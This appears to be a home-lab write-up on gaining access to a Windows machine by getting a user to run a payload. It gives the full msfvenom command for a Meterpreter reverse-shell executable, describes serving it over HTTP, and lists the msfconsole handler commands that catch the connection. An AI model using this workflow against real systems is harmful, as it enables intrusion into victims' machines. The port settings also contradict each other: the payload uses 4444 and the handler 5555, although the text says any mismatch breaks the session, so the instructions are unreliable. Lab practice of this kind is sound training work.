### Gaining Access to a Secured System - Payload Delivery via HTTP
⚠️ **Disclaimer**

This lab was conducted entirely within an isolated home lab environment using systems I own and control. The techniques demonstrated (payload generation, delivery, and handling) are for educational purposes only and must never be used against systems without explicit authorization.

**Scenerio**
For this exercise, the target system is assumed to have no known exploitable vulnerabilities. Rather than attacking a service directly, the attack relies on user-executed payload delivery, a common real-world initial access vector where a victim is convinced (or tricked) into running a malicious file themselves.

The objective of this lab was narrowly scoped: demonstrate payload creation and basic delivery over HTTP. Firewall/AV evasion was intentionally out of scope, so Windows Defender and the Windows Firewall were disabled on the target beforehand to isolate and validate the core payload-and-handler workflow without evasion noise.

##### Methodology
1. **Payload Generation**

Generated a Windows x64 Meterpreter reverse TCP payload using `msfvenom`:

```
bash

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=4444 -f exe -o shell.exe

```

`LHOST` - attacker (Kali) IP address

`LPORT` - port the target will call back to

`-f exe` - output format

`-o shell.exe` - output filename

<img width="1695" height="260" alt="image" src="https://github.com/user-attachments/assets/3b6225a9-9f6d-465e-8851-05786aea5791" />

Once executed on the target, this payload establishes a reverse Meterpreter shell back to the attacker.

2. **Payload Delivery (HTTP)**

Rather than using more evasive delivery channels, the payload was served over plain HTTP using Kali's built-in Apache server, with shell.exe placed in:

`/var/www/html/`

Apache was started, and the target retrieved the file directly via browser using the attacker's IP.

<img width="1856" height="410" alt="image" src="https://github.com/user-attachments/assets/7a016f19-37af-4ebb-b96d-88e78db32fcd" />

Payload transfer to the target machine was confirmed successful.

<img width="688" height="95" alt="image" src="https://github.com/user-attachments/assets/27ab5961-ac0c-4d22-99b4-17c6ad2d33e8" />

3. **Setting Up the Listener**

Since the payload initiates an outbound (reverse) connection, a listener must be active on the attacker machine before execution - otherwise the callback has nothing to connect to.

Using `msfconsole`, a multi/handler was configured to match the exact payload type, `LHOST`, and `LPORT` used during generation:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.129
set LPORT 5555
run
```


<img width="1182" height="466" alt="image" src="https://github.com/user-attachments/assets/18cc0d39-0b77-4cba-87cf-664d45fce8b4" />

<img width="1229" height="377" alt="image" src="https://github.com/user-attachments/assets/20f0ff5b-63f9-4586-971e-da2c9dd62fcf" />

⚠️ Key note: The handler's payload configuration must match the msfvenom payload exactly. Any mismatch (payload type, LHOST, or LPORT) will cause the handler to receive the connection but fail to establish a session - or reject it outright.

4. **Execution**

With the listener active, shell.exe was executed on the target. No visible prompt, error, or window appeared - the payload ran silently, raising no suspicion for the end user.

<img width="1236" height="186" alt="image" src="https://github.com/user-attachments/assets/613ed1b1-0ca7-4359-bd48-2772eb8d86d8" />

On the attacker side, msfconsole immediately registered the incoming connection and established a full Meterpreter session.

<img width="1235" height="649" alt="image" src="https://github.com/user-attachments/assets/d2fe8f67-ff0f-4e6f-b325-ac917fcb8548" />



